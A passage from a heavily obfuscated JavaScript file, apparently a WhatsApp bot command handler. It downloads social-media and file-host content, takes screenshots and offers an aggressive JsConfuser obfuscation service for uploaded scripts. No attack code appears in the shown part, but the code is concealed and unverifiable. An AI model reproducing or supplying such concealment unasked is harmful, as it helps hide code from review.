                if (_0xedb653[_0x5d4417(0xe3e)])
                    _0x57ed02[_0x5d4417(0x367) + 'e'](_0xedb653[_0x5d4417(0x9e2)], {
                        'text': _0x5d4417(0x11b9) + _0x5d4417(0x22e) + _0x3b47bb[_0x5d4417(0xc6c)]('@')[-0x1258 + -0x58e + 0x17e6],
                        'mentions': [_0x3b47bb]
                    }, { 'quoted': _0xedb653 });
            }
            break;
        case _0x2a5309[_0x5d4417(0x1147)]: {
                if (!_0x156b97)
                    return _0xedb653[_0x5d4417(0x105d)](_0x2a5309[_0x5d4417(0xe91)](_0x1ac933, _0x2a5309[_0x5d4417(0x689)]));
                if (!_0x156b97[_0x5d4417(0x5cc)](_0x2a5309[_0x5d4417(0x377)]))
                    return _0xedb653[_0x5d4417(0x105d)](_0x2a5309[_0x5d4417(0x7f7)]);
                await _0x57ed02[_0x5d4417(0x367) + 'e'](_0xedb653[_0x5d4417(0x9e2)], {
                    'react': {
                        'text': '🕖',
                        'key': _0xedb653[_0x5d4417(0x1185)]
                    }
                });
                var _0x574e44 = await _0x2a5309[_0x5d4417(0xe91)](fetchJson, _0x2a5309[_0x5d4417(0x1027)](_0x2a5309[_0x5d4417(0xc67)], _0x156b97));
                if (_0x574e44[_0x5d4417(0x7f0)][_0x5d4417(0x570)]) {
                    let _0x1241f2 = _0x574e44[_0x5d4417(0x7f0)][_0x5d4417(0x570)];
                    await _0x57ed02[_0x5d4417(0x367) + 'e'](_0xedb653[_0x5d4417(0x9e2)], {
                        'video': { 'url': _0x1241f2 },
                        'mimetype': _0x2a5309[_0x5d4417(0x510)]
                    }, { 'quoted': _0xedb653 });
                } else
                    return _0xedb653[_0x5d4417(0x105d)](_0x2a5309[_0x5d4417(0x2d5)]);
                await _0x57ed02[_0x5d4417(0x367) + 'e'](_0xedb653[_0x5d4417(0x9e2)], {
                    'react': {
                        'text': '',
                        'key': _0xedb653[_0x5d4417(0x1185)]
                    }
                });
            }
            break;
        case _0x2a5309[_0x5d4417(0x1197)]: {
                if (!_0x156b97)
                    return _0xedb653[_0x5d4417(0x105d)](_0x2a5309[_0x5d4417(0xe91)](_0x1ac933, _0x2a5309[_0x5d4417(0x689)]));
                if (!_0x156b97[_0x5d4417(0x3d3)](_0x2a5309[_0x5d4417(0xf46)]))
                    return _0xedb653[_0x5d4417(0x105d)](_0x2a5309[_0x5d4417(0x732)]);
                await _0x2a5309[_0x5d4417(0x10c6)](mediafire, _0x156b97)[_0x5d4417(0xe2e)](async _0x528a68 => {
                    const _0x25b1ad = _0x5d4417;
                    if (!_0x528a68[_0x25b1ad(0xf26)])
                        return _0xedb653[_0x25b1ad(0x105d)](_0x2a5309[_0x25b1ad(0xf2b)]);
                    await _0x57ed02[_0x25b1ad(0x367) + 'e'](_0xedb653[_0x25b1ad(0x9e2)], {
                        'document': { 'url': _0x528a68[_0x25b1ad(0xf26)] },
                        'fileName': _0x528a68[_0x25b1ad(0x718)],
                        'mimetype': _0x2a5309[_0x25b1ad(0xc76)](_0x2a5309[_0x25b1ad(0x816)], _0x528a68[_0x25b1ad(0xdb0)][_0x25b1ad(0xec1) + 'e']())
                    }, { 'quoted': _0xedb653 });
                })[_0x5d4417(0x1b0)](_0x1ac796 => _0xedb653[_0x5d4417(0x105d)](_0x5d4417(0x11d0)));
            }
            break;
        case _0x2a5309[_0x5d4417(0xb5b)]:
        case _0x2a5309[_0x5d4417(0xd33)]: {
                if (!_0x156b97)
                    return _0xedb653[_0x5d4417(0x105d)](_0x2a5309[_0x5d4417(0x1054)](_0x1ac933, _0x2a5309[_0x5d4417(0x689)]));
                if (!_0x156b97[_0x5d4417(0x5cc)](_0x2a5309[_0x5d4417(0x377)]))
                    return _0xedb653[_0x5d4417(0x105d)](_0x2a5309[_0x5d4417(0x732)]);
                await _0x57ed02[_0x5d4417(0x367) + 'e'](_0xedb653[_0x5d4417(0x9e2)], {
                    'react': {
                        'text': '🕖',
                        'key': _0xedb653[_0x5d4417(0x1185)]
                    }
                }), await _0x2a5309[_0x5d4417(0x53a)](tiktokDl, _0x156b97)[_0x5d4417(0xe2e)](async _0x2db5fe => {
                    const _0x4ea89a = _0x5d4417;
                    if (!_0x2db5fe[_0x4ea89a(0x466)])
                        return _0xedb653[_0x4ea89a(0x105d)](_0x2a5309[_0x4ea89a(0xf2b)]);
                    await _0x57ed02[_0x4ea89a(0x367) + 'e'](_0xedb653[_0x4ea89a(0x9e2)], {
                        'audio': { 'url': _0x2db5fe[_0x4ea89a(0x55f)][_0x4ea89a(0xa2b)] },
                        'mimetype': _0x2a5309[_0x4ea89a(0x894)]
                    }, { 'quoted': _0xedb653 }), await _0x57ed02[_0x4ea89a(0x367) + 'e'](_0xedb653[_0x4ea89a(0x9e2)], {
                        'react': {
                            'text': '',
                            'key': _0xedb653[_0x4ea89a(0x1185)]
                        }
                    });
                })[_0x5d4417(0x1b0)](_0x4302ca => _0xedb653[_0x5d4417(0x105d)](_0x5d4417(0x11d0)));
            }
            break;
        case _0x2a5309[_0x5d4417(0x25f)]: {
                if (!_0x156b97)
                    return _0xedb653[_0x5d4417(0x105d)](_0x2a5309[_0x5d4417(0x73e)](_0x1ac933, _0x2a5309[_0x5d4417(0x429)]));
                await _0x57ed02[_0x5d4417(0x367) + 'e'](_0xedb653[_0x5d4417(0x9e2)], {
                    'react': {
                        'text': '🕖',
                        'key': _0xedb653[_0x5d4417(0x1185)]
                    }
                }), await _0x2a5309[_0x5d4417(0xc88)](fetchJson, _0x5d4417(0xb54) + _0x5d4417(0xb05) + _0x5d4417(0xc2f) + _0x5d4417(0x1195) + _0x5d4417(0x9ac) + '=' + _0x156b97)[_0x5d4417(0xe2e)](_0x21e79f => {
                    const _0x2c70cd = _0x5d4417;
                    let _0x3e97c7 = '';
                    for (let _0x524a2c of _0x21e79f[_0x2c70cd(0x346)]) {
                        _0x3e97c7 += _0x2c70cd(0x1112) + _0x2c70cd(0x251) + _0x524a2c[_0x2c70cd(0x277)] + (_0x2c70cd(0xb85) + _0x2c70cd(0x58c)) + _0x524a2c[_0x2c70cd(0xf26)] + '\x0a';
                    }
                    _0xedb653[_0x2c70cd(0x105d)](_0x3e97c7), _0x57ed02[_0x2c70cd(0x367) + 'e'](_0xedb653[_0x2c70cd(0x9e2)], {
                        'react': {
                            'text': '',
                            'key': _0xedb653[_0x2c70cd(0x1185)]
                        }
                    });
                })[_0x5d4417(0x1b0)](_0xa38bd9 => _0xedb653[_0x5d4417(0x105d)](_0x5d4417(0x11d0)));
            }
            break;
        case _0x2a5309[_0x5d4417(0x10c7)]:
        case _0x2a5309[_0x5d4417(0x908)]:
        case 'ig': {
                if (!_0x156b97)
                    return _0xedb653[_0x5d4417(0x105d)](_0x2a5309[_0x5d4417(0xea8)](_0x1ac933, _0x2a5309[_0x5d4417(0x689)]));
                if (!_0x156b97[_0x5d4417(0x5cc)](_0x2a5309[_0x5d4417(0x377)]))
                    return _0xedb653[_0x5d4417(0x105d)](_0x2a5309[_0x5d4417(0x732)]);
                await _0x57ed02[_0x5d4417(0x367) + 'e'](_0xedb653[_0x5d4417(0x9e2)], {
                    'react': {
                        'text': '🕖',
                        'key': _0xedb653[_0x5d4417(0x1185)]
                    }
                }), await _0x2a5309[_0x5d4417(0xa6d)](fetchJson, _0x5d4417(0xb54) + _0x5d4417(0xb05) + _0x5d4417(0xc2f) + _0x5d4417(0xbe1) + _0x5d4417(0x779) + '=' + _0x156b97)[_0x5d4417(0xe2e)](async _0x14154a => {
                    const _0x485d71 = _0x5d4417;
                    if (!_0x14154a[_0x485d71(0x466)])
                        return _0xedb653[_0x485d71(0x105d)](_0x2a5309[_0x485d71(0xf2b)]);
                    await _0x57ed02[_0x485d71(0x367) + 'e'](_0xedb653[_0x485d71(0x9e2)], {
                        'video': { 'url': _0x14154a[_0x485d71(0x346)][_0x485d71(0xa2b)] },
                        'mimetype': _0x2a5309[_0x485d71(0x510)],
                        'caption': _0x2a5309[_0x485d71(0x1139)]
                    }, { 'quoted': _0xedb653 }), await _0x57ed02[_0x485d71(0x367) + 'e'](_0xedb653[_0x485d71(0x9e2)], {
                        'react': {
                            'text': '',
                            'key': _0xedb653[_0x485d71(0x1185)]
                        }
                    });
                })[_0x5d4417(0x1b0)](_0x373022 => _0xedb653[_0x5d4417(0x105d)](_0x5d4417(0x11d0)));
            }
            break;
        case _0x2a5309[_0x5d4417(0x5d8)]:
        case 'fb':
        case _0x2a5309[_0x5d4417(0x586)]: {
                if (!_0x156b97)
                    return _0xedb653[_0x5d4417(0x105d)](_0x2a5309[_0x5d4417(0xfe9)](_0x1ac933, _0x2a5309[_0x5d4417(0x689)]));
                if (!_0x156b97[_0x5d4417(0x5cc)](_0x2a5309[_0x5d4417(0x377)]))
                    return _0xedb653[_0x5d4417(0x105d)](_0x2a5309[_0x5d4417(0x732)]);
                await _0x57ed02[_0x5d4417(0x367) + 'e'](_0xedb653[_0x5d4417(0x9e2)], {
                    'react': {
                        'text': '🕖',
                        'key': _0xedb653[_0x5d4417(0x1185)]
                    }
                }), await _0x2a5309[_0x5d4417(0xff9)](fetchJson, _0x5d4417(0xb54) + _0x5d4417(0xb05) + _0x5d4417(0xc2f) + _0x5d4417(0xbe1) + _0x5d4417(0x1060) + '=' + _0x156b97)[_0x5d4417(0xe2e)](async _0x13c2d8 => {
                    const _0x2e1349 = _0x5d4417;
                    if (!_0x13c2d8[_0x2e1349(0x466)])
                        return _0xedb653[_0x2e1349(0x105d)](_0x2a5309[_0x2e1349(0xf2b)]);
                    await _0x57ed02[_0x2e1349(0x367) + 'e'](_0xedb653[_0x2e1349(0x9e2)], {
                        'video': { 'url': _0x13c2d8[_0x2e1349(0x346)]['sd'] },
                        'mimetype': _0x2a5309[_0x2e1349(0x510)],
                        'caption': _0x2a5309[_0x2e1349(0x356)]
                    }, { 'quoted': _0xedb653 }), await _0x57ed02[_0x2e1349(0x367) + 'e'](_0xedb653[_0x2e1349(0x9e2)], {
                        'react': {
                            'text': '',
                            'key': _0xedb653[_0x2e1349(0x1185)]
                        }
                    });
                })[_0x5d4417(0x1b0)](_0x35d137 => _0xedb653[_0x5d4417(0x105d)](_0x5d4417(0x11d0)));
            }
            break;
        case _0x2a5309[_0x5d4417(0x429)]: {
                if (!_0x156b97)
                    return _0xedb653[_0x5d4417(0x105d)](_0x2a5309[_0x5d4417(0x364)](_0x1ac933, _0x2a5309[_0x5d4417(0x689)]));
                if (!_0x156b97[_0x5d4417(0x5cc)](_0x2a5309[_0x5d4417(0x377)]))
                    return _0xedb653[_0x5d4417(0x105d)](_0x2a5309[_0x5d4417(0x732)]);
                await _0x57ed02[_0x5d4417(0x367) + 'e'](_0xedb653[_0x5d4417(0x9e2)], {
                    'react': {
                        'text': '🕖',
                        'key': _0xedb653[_0x5d4417(0x1185)]
                    }
                }), await _0x2a5309[_0x5d4417(0xfbb)](fetchJson, _0x5d4417(0xb54) + _0x5d4417(0xb05) + _0x5d4417(0xc2f) + _0x5d4417(0xbe1) + _0x5d4417(0x640) + _0x5d4417(0xf4d) + _0x156b97)[_0x5d4417(0xe2e)](async _0x91f746 => {
                    const _0x26f7f4 = _0x5d4417;
                    if (!_0x91f746[_0x26f7f4(0x466)])
                        return _0xedb653[_0x26f7f4(0x105d)](_0x2a5309[_0x26f7f4(0xf2b)]);
                    await _0x57ed02[_0x26f7f4(0x367) + 'e'](_0xedb653[_0x26f7f4(0x9e2)], {
                        'video': { 'url': _0x91f746[_0x26f7f4(0x346)][_0x26f7f4(0x570)] },
                        'mimetype': _0x2a5309[_0x26f7f4(0x510)],
                        'caption': _0x2a5309[_0x26f7f4(0xd5a)]
                    }, { 'quoted': _0xedb653 }), await _0x57ed02[_0x26f7f4(0x367) + 'e'](_0xedb653[_0x26f7f4(0x9e2)], {
                        'react': {
                            'text': '',
                            'key': _0xedb653[_0x26f7f4(0x1185)]
                        }
                    });
                })[_0x5d4417(0x1b0)](_0x4394d5 => _0xedb653[_0x5d4417(0x105d)](_0x5d4417(0x11d0)));
            }
            break;
        case _0x2a5309[_0x5d4417(0x2ba)]: {
                if (!_0x156b97)
                    return _0xedb653[_0x5d4417(0x105d)](_0x2a5309[_0x5d4417(0xbaa)](_0x1ac933, _0x2a5309[_0x5d4417(0xbba)]));
                let _0x5e5bb8 = /(?:https|git)(?::\/\/|@)github\.com[\/:]([^\/:]+)\/(.+)/i;
                if (!_0x5e5bb8[_0x5d4417(0x8cc)](_0x156b97))
                    return _0xedb653[_0x5d4417(0x105d)](_0x2a5309[_0x5d4417(0x732)]);
                try {
                    let [, _0x1d2dbd, _0x21e200] = _0x5c5935[0x1237 * 0x1 + -0xdb8 + -0x1 * 0x47f][_0x5d4417(0x887)](_0x5e5bb8) || [];
                    _0x21e200 = _0x21e200[_0x5d4417(0xe51)](/.git$/, '');
                    let _0x9fa869 = _0x5d4417(0xb54) + _0x5d4417(0x1207) + _0x5d4417(0x1178) + _0x1d2dbd + '/' + _0x21e200 + _0x5d4417(0x75b), _0x3e166c = (await _0x2a5309[_0x5d4417(0xac3)](fetch, _0x9fa869, { 'method': _0x2a5309[_0x5d4417(0x226)] }))[_0x5d4417(0x10cd)][_0x5d4417(0x29d)](_0x2a5309[_0x5d4417(0x114c)])[_0x5d4417(0x887)](/attachment; filename=(.*)/)[-0x384 + 0x5bb + -0x236];
                    _0x57ed02[_0x5d4417(0x367) + 'e'](_0xedb653[_0x5d4417(0x9e2)], {
                        'document': { 'url': _0x9fa869 },
                        'mimetype': _0x2a5309[_0x5d4417(0x4e7)],
                        'fileName': '' + _0x3e166c
                    }, { 'quoted': _0xedb653 });
                } catch (_0x15060d) {
                    await _0xedb653[_0x5d4417(0x105d)](_0x5d4417(0x27f) + _0x5d4417(0x2fc) + _0x5d4417(0x6a0) + _0x5d4417(0x50f));
                }
            }
            break;
        case 'tt':
        case _0x2a5309[_0x5d4417(0xee9)]: {
                if (!_0x156b97)
                    return _0xedb653[_0x5d4417(0x105d)](_0x2a5309[_0x5d4417(0x87d)](_0x1ac933, _0x2a5309[_0x5d4417(0x44a)]));
                if (!_0x156b97[_0x5d4417(0x5cc)](_0x2a5309[_0x5d4417(0x377)]))
                    return _0xedb653[_0x5d4417(0x105d)](_0x2a5309[_0x5d4417(0x924)](_0x1ac933, _0x2a5309[_0x5d4417(0x44a)]));
                await _0x2a5309[_0x5d4417(0x710)](tiktokDl, q)[_0x5d4417(0xe2e)](async _0x3778fd => {
                    const _0x3489d8 = _0x5d4417;
                    await _0x57ed02[_0x3489d8(0x367) + 'e'](_0xedb653[_0x3489d8(0x9e2)], {
                        'react': {
                            'text': '🕖',
                            'key': _0xedb653[_0x3489d8(0x1185)]
                        }
                    });
                    if (!_0x3778fd[_0x3489d8(0x466)])
                        return _0xedb653[_0x3489d8(0x105d)](_0x2a5309[_0x3489d8(0xec3)]);
                    if (_0x2a5309[_0x3489d8(0xfa8)](_0x3778fd[_0x3489d8(0xd8c)], -0x35 * 0x5b + 0x1f0d * -0x1 + 0x31e4) && _0x2a5309[_0x3489d8(0xfa8)](_0x3778fd[_0x3489d8(0xf3c)], _0x2a5309[_0x3489d8(0xc24)])) {
                        let _0x722dde = new Array(), _0x4f0715 = -0x7 * 0x245 + -0xae6 + 0x1ac9;
                        for (let _0x2f140a of _0x3778fd[_0x3489d8(0x1059)]) {
                            let _0x3a1241 = await _0x2a5309[_0x3489d8(0xac3)](prepareWAMessageMedia, { 'image': { 'url': '' + _0x2f140a[_0x3489d8(0xa2b)] } }, { 'upload': _0x57ed02[_0x3489d8(0xb6b) + _0x3489d8(0x877)] });
                            await _0x722dde[_0x3489d8(0x706)]({
                                'header': proto[_0x3489d8(0x37b)][_0x3489d8(0x3d6) + _0x3489d8(0xb18)][_0x3489d8(0x358)][_0x3489d8(0xce6)]({
                                    'title': _0x3489d8(0xc34) + _0x3489d8(0x9c4) + (_0x4f0715 += 0x904 + 0x3 * 0x727 + 0x258 * -0xd) + '*',
                                    'hasMediaAttachment': !![],
                                    ..._0x3a1241
                                }),
                                'nativeFlowMessage': proto[_0x3489d8(0x37b)][_0x3489d8(0x3d6) + _0x3489d8(0xb18)][_0x3489d8(0x721) + _0x3489d8(0x37b)][_0x3489d8(0xce6)]({
                                    'buttons': [{
                                            'name': _0x2a5309[_0x3489d8(0xe6d)],
                                            'buttonParamsJson': _0x3489d8(0x780) + _0x3489d8(0xfc2) + _0x3489d8(0x10d2) + _0x3489d8(0x595) + ':\x22' + _0x2f140a[_0x3489d8(0xa2b)] + (_0x3489d8(0xde3) + _0x3489d8(0xf64) + _0x3489d8(0x8ca) + _0x3489d8(0xed9) + '\x22}')
                                        }]
                                })
                            });
                        }
                        const _0x77fb7a = await _0x2a5309[_0x3489d8(0x320)](generateWAMessageFromContent, _0xedb653[_0x3489d8(0x9e2)], {
                            'viewOnceMessageV2Extension': {
                                'message': {
                                    'messageContextInfo': {
                                        'deviceListMetadata': {},
                                        'deviceListMetadataVersion': 0x2
                                    },
                                    'interactiveMessage': proto[_0x3489d8(0x37b)][_0x3489d8(0x3d6) + _0x3489d8(0xb18)][_0x3489d8(0xce6)]({
                                        'body': proto[_0x3489d8(0x37b)][_0x3489d8(0x3d6) + _0x3489d8(0xb18)][_0x3489d8(0xeaf)][_0x3489d8(0xce6)]({ 'text': _0x2a5309[_0x3489d8(0x613)] }),
                                        'carouselMessage': proto[_0x3489d8(0x37b)][_0x3489d8(0x3d6) + _0x3489d8(0xb18)][_0x3489d8(0x46d) + _0x3489d8(0xa35)][_0x3489d8(0xce6)]({ 'cards': _0x722dde })
                                    })
                                }
                            }
                        }, {
                            'userJid': _0xedb653[_0x3489d8(0xeee)],
                            'quoted': _0xedb653
                        });
                        await _0x57ed02[_0x3489d8(0xa9a) + 'ge'](_0xedb653[_0x3489d8(0x9e2)], _0x77fb7a[_0x3489d8(0x2f3)], { 'messageId': _0x77fb7a[_0x3489d8(0x1185)]['id'] });
                    } else {
                        let _0x1eba10 = await _0x3778fd[_0x3489d8(0x1059)][_0x3489d8(0x49a)](_0x3c7ffb => _0x3c7ffb[_0x3489d8(0x5a8)] == _0x3489d8(0x221) + _0x3489d8(0x341) || _0x3c7ffb[_0x3489d8(0x5a8)] == _0x3489d8(0x221) + 'k');
                        await _0x57ed02[_0x3489d8(0x367) + 'e'](_0xedb653[_0x3489d8(0x9e2)], {
                            'video': { 'url': _0x1eba10[_0x3489d8(0xa2b)] },
                            'mimetype': _0x2a5309[_0x3489d8(0x510)],
                            'caption': _0x3489d8(0x62d) + _0x3489d8(0xaad) + '*'
                        }, { 'quoted': _0xedb653 });
                    }
                })[_0x5d4417(0x1b0)](_0x336434 => console[_0x5d4417(0xd16)](_0x336434)), await _0x57ed02[_0x5d4417(0x367) + 'e'](_0xedb653[_0x5d4417(0x9e2)], {
                    'react': {
                        'text': '',
                        'key': _0xedb653[_0x5d4417(0x1185)]
                    }
                });
            }
            break;
        case _0x2a5309[_0x5d4417(0x6d7)]: {
                if (!_0x156b97)
                    return _0xedb653[_0x5d4417(0x105d)](_0x2a5309[_0x5d4417(0xf6e)](_0x1ac933, _0x2a5309[_0x5d4417(0xba5)]));
                if (!_0x2a5309[_0x5d4417(0x796)](isUrl, _0x156b97))
                    return _0xedb653[_0x5d4417(0x105d)](_0x2a5309[_0x5d4417(0xf6e)](_0x1ac933, _0x2a5309[_0x5d4417(0xba5)]));
                const {
                        screenshotV1: _0x402263,
                        screenshotV2: _0x263294,
                        screenshotV3: _0x18897c
                    } = _0x2a5309[_0x5d4417(0x65a)](require, _0x2a5309[_0x5d4417(0x8f7)]), _0x4a54e7 = _0x2a5309[_0x5d4417(0x985)](require, 'fs');
                var _0x23e92d = await _0x2a5309[_0x5d4417(0xff9)](_0x263294, _0x156b97);
                await _0x57ed02[_0x5d4417(0x367) + 'e'](_0xedb653[_0x5d4417(0x9e2)], {
                    'image': _0x23e92d,
                    'mimetype': _0x2a5309[_0x5d4417(0x1043)]
                }, { 'quoted': _0xedb653 });
            }
            break;
        case _0x2a5309[_0x5d4417(0x716)]:
        case _0x2a5309[_0x5d4417(0x6d5)]: {
                if (!_0x47f98c)
                    return _0x2a5309[_0x5d4417(0x5ca)](_0x458b9f, mess[_0x5d4417(0x41d)]);
                if (!_0xedb653[_0x5d4417(0x7eb)])
                    return _0xedb653[_0x5d4417(0x105d)](_0x2a5309[_0x5d4417(0x1138)](_0x1ac933, _0x2a5309[_0x5d4417(0xdd4)]));
                if (_0x2a5309[_0x5d4417(0x73c)](_0x5a9802, _0x2a5309[_0x5d4417(0xad6)]))
                    return _0xedb653[_0x5d4417(0x105d)](_0x2a5309[_0x5d4417(0x86c)](_0x1ac933, _0x2a5309[_0x5d4417(0xdd4)]));
                let _0x187388 = await _0xedb653[_0x5d4417(0x7eb)][_0x5d4417(0x7f0)](), _0x14cc64 = _0xedb653[_0x5d4417(0x7eb)][_0x5d4417(0x2f3)][_0x5d4417(0x117e) + _0x5d4417(0xa35)][_0x5d4417(0x10a2)];
                await fs[_0x5d4417(0xe19) + _0x5d4417(0x6d3)](_0x5d4417(0x9b8) + _0x5d4417(0x30e) + _0x14cc64, _0x187388), await _0xedb653[_0x5d4417(0x105d)](_0x2a5309[_0x5d4417(0x2cc)]), await JsConfuser[_0x5d4417(0x8f1)](await fs[_0x5d4417(0xf73) + 'nc'](_0x5d4417(0x9b8) + _0x5d4417(0x30e) + _0x14cc64)[_0x5d4417(0xef4)](), {
                    'target': _0x2a5309[_0x5d4417(0x259)],
                    'preset': _0x2a5309[_0x5d4417(0x9cd)],
                    'calculator': !![],
                    'compact': !![],
                    'hexadecimalNumbers': !![],
                    'controlFlowFlattening': 0.75,
                    'deadCode': 0.2,
                    'dispatcher': !![],
                    'duplicateLiteralsRemoval': 0.75,
                    'flatten': !![],
                    'globalConcealing': !![],
                    'identifierGenerator': _0x2a5309[_0x5d4417(0x57d)],
                    'minify': !![],
                    'movedDeclarations': !![],
                    'objectExtraction': !![],
                    'opaquePredicates': 0.75,
                    'renameVariables': !![],
                    'renameGlobals': !![],
                    'shuffle': {
                        'hash': 0.5,
                        'true': 0.5
                    },
                    'stack': !![],
                    'stringConcealing': !![],
                    'stringCompression': !![],
                    'stringEncoding': !![],
                    'stringSplitting': 0.75,
                    'rgf': ![]
                })[_0x5d4417(0xe2e)](async _0x5e83d6 => {
                    const _0x36f0e2 = _0x5d4417;
                    await fs[_0x36f0e2(0xe19) + _0x36f0e2(0x6d3)](_0x36f0e2(0x9b8) + _0x36f0e2(0x30e) + _0x14cc64, _0x5e83d6), await _0x57ed02[_0x36f0e2(0x367) + 'e'](_0xedb653[_0x36f0e2(0x9e2)], {
                        'document': fs[_0x36f0e2(0xf73) + 'nc'](_0x36f0e2(0x9b8) + _0x36f0e2(0x30e) + _0x14cc64),
                        'mimetype': _0x2a5309[_0x36f0e2(0xad6)],
                        'fileName': _0x14cc64,
                        'caption': _0x2a5309[_0x36f0e2(0x417)]
                    }, { 'quoted': _0xedb653 });
                })[_0x5d4417(0x1b0)](_0x4b2359 => _0xedb653[_0x5d4417(0x105d)](_0x5d4417(0xe50) + _0x4b2359)), await fs[_0x5d4417(0xf9e)](_0x5d4417(0x9b8) + _0x5d4417(0x30e) + _0x14cc64);
            }
            break;
        case _0x2a5309[_0x5d4417(0x396)]:
        case _0x2a5309[_0x5d4417(0x7d3)]: {
                if (!_0x47f98c)
                    return _0x2a5309[_0x5d4417(0x303)](_0x458b9f, mess[_0x5d4417(0x41d)]);
                if (!_0xedb653[_0x5d4417(0x7eb)])
                    return _0xedb653[_0x5d4417(0x105d)](_0x2a5309[_0x5d4417(0x2e5)]);
                if (_0x2a5309[_0x5d4417(0x73c)](_0x5a9802, _0x2a5309[_0x5d4417(0xad6)]))
                    return _0x2a5309[_0x5d4417(0xa6d)](reply, _0x2a5309[_0x5d4417(0x2e5)]);
                let _0x27a6be = await _0xedb653[_0x5d4417(0x7eb)][_0x5d4417(0x7f0)](), _0x622ab2 = _0xedb653[_0x5d4417(0x7eb)][_0x5d4417(0x2f3)][_0x5d4417(0x117e) + _0x5d4417(0xa35)][_0x5d4417(0x10a2)];
                await fs[_0x5d4417(0xe19) + _0x5d4417(0x6d3)](_0x5d4417(0x9f6) + _0x622ab2 + _0x5d4417(0x11b3), _0x27a6be), await _0xedb653[_0x5d4417(0x105d)](_0x2a5309[_0x5d4417(0x11aa)]), await JsConfuser[_0x5d4417(0x8f1)](await fs[_0x5d4417(0xf73) + 'nc'](_0x5d4417(0x9f6) + _0x622ab2 + _0x5d4417(0x11b3))[_0x5d4417(0xef4)](), {
                    'target': _0x2a5309[_0x5d4417(0x259)],
                    'preset': _0x2a5309[_0x5d4417(0x9cd)],
                    'compact': !![],
                    'minify': !![],
                    'flatten': !![],
                    'identifierGenerator': function () {
                        const _0x26dcaa = _0x5d4417, _0x1e5e8c = {
                                'Kifrk': _0x2a5309[_0x26dcaa(0xde1)],
                                'EqIfV': function (_0x29cfa8, _0x18a8be) {
                                    const _0x367c2f = _0x26dcaa;
                                    return _0x2a5309[_0x367c2f(0x26b)](_0x29cfa8, _0x18a8be);
                                },
                                'MnThE': function (_0x1990c2, _0x492df5) {
                                    const _0xc8acc = _0x26dcaa;
                                    return _0x2a5309[_0xc8acc(0x681)](_0x1990c2, _0x492df5);
                                }
                            }, _0x17ece1 = _0x2a5309[_0x26dcaa(0x7fc)](_0x2a5309[_0x26dcaa(0xc86)], _0x2a5309[_0x26dcaa(0xc86)]);
                        function _0x4cfa35(_0x52e150) {
                            const _0x3311a2 = _0x26dcaa;
                            return _0x52e150[_0x3311a2(0xe51)](/[^a-zA-Z/*ᨒZenn/*^/*($break)*/]/g, '');
                        }
                        function _0x471ebe(_0x5e42fb) {
                            const _0x73e2 = _0x26dcaa;
                            let _0x3f1969 = '';
                            const _0x4a6c12 = _0x1e5e8c[_0x73e2(0x857)], _0x11b643 = _0x4a6c12[_0x73e2(0xf65)];
                            for (let _0x5991fc = 0x789 + -0x15e6 + -0xe5d * -0x1; _0x1e5e8c[_0x73e2(0x11bf)](_0x5991fc, _0x5e42fb); _0x5991fc++) {
                                _0x3f1969 += _0x4a6c12[_0x73e2(0xff0)](Math[_0x73e2(0xe09)](_0x1e5e8c[_0x73e2(0xdf2)](Math[_0x73e2(0xdc9)](), _0x11b643)));
                            }
                            return _0x3f1969;
                        }
                        return _0x2a5309[_0x26dcaa(0x8b1)](_0x2a5309[_0x26dcaa(0x53a)](_0x4cfa35, _0x17ece1), _0x2a5309[_0x26dcaa(0x53a)](_0x471ebe, -0x1 * -0x1615 + 0x7 * 0x2fa + 0x895 * -0x5));
                    },
                    'renameVariables': !![],
                    'renameGlobals': !![],
                    'stringEncoding': 0.01,
                    'stringSplitting': 0.1,
                    'stringConcealing': !![],
                    'stringCompression': !![],
                    'duplicateLiteralsRemoval': !![],
                    'shuffle': {
                        'hash': ![],
                        'true': ![]
                    },
                    'stack': ![],
                    'controlFlowFlattening': ![],
                    'opaquePredicates': ![],
                    'deadCode': ![],
                    'dispatcher': ![],
                    'rgf': ![],
                    'calculator': ![],
                    'hexadecimalNumbers': ![],
                    'movedDeclarations': !![],
                    'objectExtraction': !![],
                    'globalConcealing': !![]
                })[_0x5d4417(0xe2e)](async _0x1e554f => {
                    const _0x13e98b = _0x5d4417;
                    await fs[_0x13e98b(0xe19) + _0x13e98b(0x6d3)](_0x13e98b(0x9f6) + _0x622ab2 + _0x13e98b(0x11b3), _0x1e554f), await _0x57ed02[_0x13e98b(0x367) + 'e'](_0xedb653[_0x13e98b(0x9e2)], {
                        'document': fs[_0x13e98b(0xf73) + 'nc'](_0x13e98b(0x9f6) + _0x622ab2 + _0x13e98b(0x11b3)),
                        'mimetype': _0x2a5309[_0x13e98b(0xad6)],
                        'fileName': _0x622ab2,
                        'caption': _0x2a5309[_0x13e98b(0x7ed)]
                    }, { 'quoted': _0xedb653 });
                })[_0x5d4417(0x1b0)](_0x5cb8a1 => _0xedb653[_0x5d4417(0x105d)](_0x5d4417(0xe50) + _0x5cb8a1)), await fs[_0x5d4417(0xf9e)](_0x5d4417(0x9f6) + _0x622ab2 + _0x5d4417(0x11b3));
            }
            break;
        case _0x2a5309[_0x5d4417(0xc45)]:
        case _0x2a5309[_0x5d4417(0x65f)]: {
                const _0x241a00 = _0x2a5309[_0x5d4417(0x415)][_0x5d4417(0xc6c)]('|');
                let _0x29e733 = 0x2 * -0x916 + -0x24f7 + 0x3723;
                while (!![]) {
                    switch (_0x241a00[_0x29e733++]) {
                    case '0':
                        if (!_0x156b97)
                            return _0xedb653[_0x5d4417(0x105d)](_0x2a5309[_0x5d4417(0x643)](_0x1ac933, _0x2a5309[_0x5d4417(0xba5)]));
                        continue;
                    case '1':
                        if (!_0x2a5309[_0x5d4417(0x764)](isUrl, _0x156b97))
                            return _0xedb653[_0x5d4417(0x105d)](_0x2a5309[_0x5d4417(0xa92)](_0x1ac933, _0x2a5309[_0x5d4417(0xba5)]));
                        continue;
                    case '2':
                        return _0xedb653[_0x5d4417(0x105d)](_0x1aa8ba);
                    case '3':
                        var _0x318062 = await axios[_0x5d4417(0x29d)](_0x2a5309[_0x5d4417(0x65e)](_0x2a5309[_0x5d4417(0x6a5)], _0x2a5309[_0x5d4417(0x7a5)](encodeURIComponent, _0x156b97)));
                        continue;
                    case '4':
                        var _0x1aa8ba = _0x5d4417(0x1aa) + _0x5d4417(0x297) + _0x5d4417(0x931) + _0x318062[_0x5d4417(0x1059)][_0x5d4417(0xef4)]() + '\x0a';
                        continue;
                    }
                    break;
                }
            }
            break;
        case _0x2a5309[_0x5d4417(0x32c)]: {
                if (!_0x156b97)
